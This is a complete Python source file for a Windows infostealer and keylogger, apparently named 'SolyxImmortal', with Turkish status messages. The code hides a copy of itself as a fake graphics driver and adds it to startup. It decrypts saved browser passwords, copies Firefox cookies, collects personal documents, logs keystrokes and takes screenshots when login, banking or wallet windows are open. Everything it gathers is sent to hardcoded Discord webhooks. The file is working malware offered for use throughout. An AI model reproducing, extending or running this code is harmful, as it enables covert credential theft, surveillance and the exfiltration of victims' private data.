import os
import sys
import json
import sqlite3
import shutil
import requests
import time
import pyautogui
import threading
import base64
import zipfile
import pygetwindow as gw
from pynput import keyboard
import win32crypt

try:
    from Cryptodome.Cipher import AES
except ImportError:
    from Crypto.Cipher import AES

# ─────────────────────────────────────────────────────
#                   CONFIGURATION
# ─────────────────────────────────────────────────────

LOG_WEBHOOK = "https://discord.com/api/webhooks/1456676327376552150/ahXo1zNOpHNn7yHGhayaErgQzT3D8vBUd1zLgOp7y0KviO9uRS06WR2fO7EMfktyU29o"
IMG_WEBHOOK = "https://discord.com/api/webhooks/1456676442502070383/FW_-lN8hcNY4OpQa2nmYpJUkZsAoT9mVS7Qy8IxDIVX8_YJPBmaKgI6EJBI5R55NDGil"
USER_ID = "773495051854675979"


class SolyxImmortal:
    def __init__(self):
        self.temp = os.getenv("TEMP")
        self.log_buffer = ""
        self.is_critical_typing = False
        self.user_home = os.path.expanduser("~")
        
        self.zip_folder = os.path.join(self.temp, "Solyx_Pack_Final")
        
        self.doc_extensions = (".txt", ".pdf", ".docx", ".xlsx")
        
        self.browsers = {
            "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
            "Edge":   os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
            "Brave":  os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
            "OperaGX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
        }

    def _persist(self):
        """Copy itself to system and add to startup"""
        appdata = os.getenv("APPDATA")
        target_dir = os.path.join(appdata, "WindowsGraphics")
        target_file = os.path.join(target_dir, "win_gfx_driver.exe")

        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        if not os.path.exists(target_file):
            shutil.copy2(sys.executable, target_file)
            os.system(f'attrib +h +s "{target_file}"')

        # Add to startup
        try:
            import winreg as reg
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "WindowsGfxDriver", 0, reg.REG_SZ, target_file)
            reg.CloseKey(key)
        except:
            pass

    def _send(self, url, msg, file=None, mention=False):
        content = f"<@{USER_ID}> {msg}" if mention else msg

        try:
            if file and os.path.exists(file):
                with open(file, "rb") as f:
                    requests.post(
                        url,
                        data={"content": content},
                        files={"file": f},
                        timeout=60
                    )
            else:
                requests.post(
                    url,
                    json={"content": content},
                    timeout=20
                )
        except:
            pass

    def _get_key(self, path: str):
        try:
            with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
                c = json.loads(f.read())
            encrypted_key = base64.b64decode(c["os_crypt"]["encrypted_key"])
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
            return decrypted_key
        except:
            return None

    def _collect_and_zip(self):
        if not os.path.exists(self.zip_folder):
            os.makedirs(self.zip_folder)

        vault_txt = ""

        # ─── Passwords from Chromium-based browsers ───────────────────────
        for b_name, b_path in self.browsers.items():
            key = self._get_key(b_path)
            if not key:
                continue

            for prof in ("Default", "Profile 1", "Profile 2"):
                p_db = os.path.join(b_path, prof, "Login Data")
                if not os.path.exists(p_db):
                    continue

                tmp = os.path.join(self.temp, f"t_p_{b_name}")
                shutil.copy2(p_db, tmp)

                try:
                    conn = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
                    cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for u, user, pwd in cursor.fetchall():
                        if not user or not pwd:
                            continue
                            
                        try:
                            cipher = AES.new(key, AES.MODE_GCM, pwd[3:15])
                            dec = cipher.decrypt(pwd[15:-16]).decode()
                            vault_txt += f"[{b_name}] {u} | {user} | {dec}\n"
                        except:
                            pass

                    conn.close()
                except:
                    pass
                finally:
                    try:
                        os.remove(tmp)
                    except:
                        pass

        if vault_txt:
            try:
                with open(os.path.join(self.zip_folder, "sifreler.txt"), "w", encoding="utf-8") as f:
                    f.write(vault_txt)
            except:
                pass

        # ─── Firefox cookies ──────────────────────────────────────────────
        ff_base = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if os.path.exists(ff_base):
            for prof in os.listdir(ff_base):
                c_db = os.path.join(ff_base, prof, "cookies.sqlite")
                if os.path.exists(c_db):
                    try:
                        shutil.copy2(c_db, os.path.join(self.zip_folder, f"ff_cookies_{prof}.sqlite"))
                    except:
                        pass

        # ─── Interesting documents (max ~10 MB) ────────────────────────────
        for root, _, files in os.walk(self.user_home):
            # Skip some common large folders
            if any(x in root for x in ("AppData", "Windows", "Program Files", "Temp")):
                continue

            for file in files:
                if not file.lower().endswith(self.doc_extensions):
                    continue
                try:
                    size = os.path.getsize(os.path.join(root, file))
                    if size < 100 or size > 10*1024*1024:  # 100 bytes – 10 MB
                        continue
                    shutil.copy2(os.path.join(root, file), os.path.join(self.zip_folder, file))
                except:
                    pass

        # ─── Create final zip and send ────────────────────────────────────
        zip_path = os.path.join(self.temp, "Solyx_Final_Data.zip")

        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
            for file in os.listdir(self.zip_folder):
                zipf.write(
                    os.path.join(self.zip_folder, file),
                    file
                )

        self._send(LOG_WEBHOOK, "🛡️ **Operasyon Başarılı: Veri Paketi Gönderildi**", zip_path, mention=True)

        # Cleanup
        try:
            shutil.rmtree(self.zip_folder)
            os.remove(zip_path)
        except:
            pass

    def _key_logic(self):
        while True:
            time.sleep(60)
            if self.log_buffer:
                try:
                    self._send(
                        LOG_WEBHOOK,
                        f"⌨️ **Log Raporu:**\n```{self.log_buffer}```",
                        mention=self.is_critical_typing
                    )
                except:
                    pass
                self.log_buffer = ""

    def _on_press(self, key):
        try:
            k = str(key).replace("'", "")
            
            if k == "Key.enter":
                self.log_buffer += "\n"
            elif k == "Key.space":
                self.log_buffer += " "
            elif "Key." not in k:
                self.log_buffer += k
        except:
            pass

    def _screens(self):
        last_rout = time.time()
        critical_keywords = (
            "login", "giriş", "oturum aç", "sign in",
            "bank", "steam", "gmail", "wallet", "parola"
        )

        while True:
            try:
                win = gw.getActiveWindow()
                if win and win.title:
                    title = win.title.lower()
                    if any(kw in title for kw in critical_keywords):
                        self.is_critical_typing = True
                        p = os.path.join(self.temp, "alert.png")
                        pyautogui.screenshot(p)
                        self._send(
                            IMG_WEBHOOK,
                            f"🚨 **Kritik Giriş:** `{win.title}`",
                            p,
                            mention=True
                        )
                        os.remove(p)
                        time.sleep(45)
                        continue

                    self.is_critical_typing = False

                # Routine screenshot every ~2 minutes
                if time.time() - last_rout > 120:
                    p = os.path.join(self.temp, "routine.png")
                    pyautogui.screenshot(p)
                    self._send(IMG_WEBHOOK, "⏰ **Rutin SS**", p)
                    os.remove(p)
                    last_rout = time.time()

            except:
                pass

            time.sleep(5)

    def start(self):
        self._persist()
        time.sleep(15)

        threading.Thread(target=self._collect_and_zip, daemon=True).start()
        threading.Thread(target=self._key_logic,   daemon=True).start()
        threading.Thread(target=self._screens,     daemon=True).start()

        with keyboard.Listener(on_press=self._on_press) as l:
            l.join()


if __name__ == "__main__":
    try:
        SolyxImmortal().start()
    except:
        pass